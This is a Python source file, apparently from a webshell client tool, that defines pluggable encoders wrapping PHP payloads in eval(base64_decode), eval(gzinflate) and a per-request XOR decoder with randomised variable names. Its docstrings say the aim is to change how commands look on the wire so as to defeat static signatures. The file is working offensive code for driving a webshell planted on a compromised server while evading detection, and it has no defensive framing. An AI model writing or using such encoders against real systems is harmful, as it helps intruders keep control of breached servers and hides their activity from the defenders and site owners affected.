"""Pluggable payload encoders.

The webshell ``eval``s whatever we place in its parameter, so an *encoder* turns
a piece of PHP into the PHP we actually send — varying how the payload looks on
the wire (to frustrate static signatures) while decoding to the same code
server-side. This is v1's unfinished TODO ("编写多种编码器") made real.

Each encoder takes the (token-wrapped) PHP and returns a complete PHP statement
that, when evaluated by the shell, runs it.
"""

from __future__ import annotations

import base64
import string
import zlib
from collections.abc import Callable

from .utils.strings import random_string

Encoder = Callable[[str], str]


def base64_encode(php: str) -> str:
    """``eval(base64_decode('...'))`` — the transport-safe default."""
    encoded = base64.b64encode(php.encode()).decode()
    return f"eval(base64_decode('{encoded}'));"


def gzip_encode(php: str) -> str:
    """``eval(gzinflate(base64_decode('...')))`` — smaller and different on the wire."""
    compressor = zlib.compressobj(9, zlib.DEFLATED, -15)  # raw DEFLATE for gzinflate()
    data = compressor.compress(php.encode()) + compressor.flush()
    return f"eval(gzinflate(base64_decode('{base64.b64encode(data).decode()}')));"


def xor_encode(php: str) -> str:
    """XOR the payload with a random key, with randomized variable names.

    Both the key and the decoder's variable names change every request, so the
    body has no stable byte signature.
    """
    key = random_string(8, string.ascii_letters)
    raw = php.encode()
    data = bytes(b ^ ord(key[i % len(key)]) for i, b in enumerate(raw))
    encoded = base64.b64encode(data).decode()
    var_d, var_k, var_o, var_i = (f"v{p}{random_string(4)}" for p in "dkoi")
    return (
        f"${var_d}=base64_decode('{encoded}');${var_k}='{key}';${var_o}='';"
        f"for(${var_i}=0;${var_i}<strlen(${var_d});${var_i}++)"
        f"{{${var_o}.=${var_d}[${var_i}]^${var_k}[${var_i}%strlen(${var_k})];}}"
        f"eval(${var_o});"
    )


ENCODERS: dict[str, Encoder] = {
    "base64": base64_encode,
    "gzip": gzip_encode,
    "xor": xor_encode,
}


def get_encoder(name: str) -> Encoder:
    try:
        return ENCODERS[name]
    except KeyError:
        raise ValueError(
            f"unknown encoder: {name!r}; choose from {', '.join(ENCODERS)}"
        ) from None
